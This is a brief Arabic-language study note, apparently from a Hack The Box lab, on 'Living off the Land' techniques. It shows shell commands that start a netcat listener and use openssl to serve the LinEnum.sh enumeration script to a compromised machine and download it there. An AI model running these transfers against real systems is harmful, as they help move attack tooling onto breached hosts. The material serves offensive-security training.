- مصطلح الLiving off The Land هو أن انا كا attacker بستخدم الأدوات الأصلية والشرعية اللي موجودة بالفعل على جهاز الvictim، بدل ما اجيب أدوات ضارة من بره
---
...
```shell-session
0xTroj6n@htb[/htb]$ sudo nc -lvnp 8000
...
```shell-session
0xTroj6n@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
...
```shell-session
0xTroj6n@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
#### Download File from the Compromised Machine

```shell-session
0xTroj6n@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
---
